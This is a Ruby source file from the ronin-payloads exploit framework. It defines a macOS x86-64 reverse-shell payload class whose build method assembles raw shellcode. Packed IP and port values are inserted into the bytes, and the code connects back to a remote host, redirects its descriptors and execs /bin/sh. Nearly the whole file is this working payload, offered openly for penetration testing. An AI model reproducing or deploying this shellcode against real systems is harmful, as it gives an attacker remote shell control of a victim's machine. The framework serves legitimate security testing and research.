# encoding: ASCII-8BIT
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2024 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/reverse_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module MacOS
        module X86_64
          #
          # macOS x86-64 shellcode that spawns a connect back reverse shell.
          #
          class ReverseShell < ReverseShellPayload

            register 'shellcode/macos/x86_64/reverse_shell'

            arch :x86_64
            os :macos

            author 'Jacob Hammack', email:   'jacob.hammack@hammackj.com',
                                    website: 'http://www.hammackj.com'

            summary 'macOS x86-64 reverse shell shellcode'
            description <<~DESC
              macOS x86-64 shellcode that spawns a connect back reverse shell.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-761.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x61\x4c\x89\xc0\x48" \
                         "\x31\xd2\x48\x89\xd6\x48\xff\xc6\x48\x89\xf7\x48\xff\xc7\x0f" \
                         "\x05\x49\x89\xc4\x49\xbd\x01\x01#{packed_port}#{packed_ipv4}\x41" \
                         "\xb1\xff\x4d\x29\xcd\x41\x55\x49\x89\xe5\x49\xff\xc0\x4c\x89" \
                         "\xc0\x4c\x89\xe7\x4c\x89\xee\x48\x83\xc2\x10\x0f\x05\x49\x83" \
                         "\xe8\x08\x48\x31\xf6\x4c\x89\xc0\x4c\x89\xe7\x0f\x05\x48\x83" \
                         "\xfe\x02\x48\xff\xc6\x76\xef\x49\x83\xe8\x1f\x4c\x89\xc0\x48" \
                         "\x31\xd2\x49\xbd\xff\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xed" \
                         "\x08\x41\x55\x48\x89\xe7\x48\x31\xf6\x0f\x05"
            end

          end
        end
      end
    end
  end
end
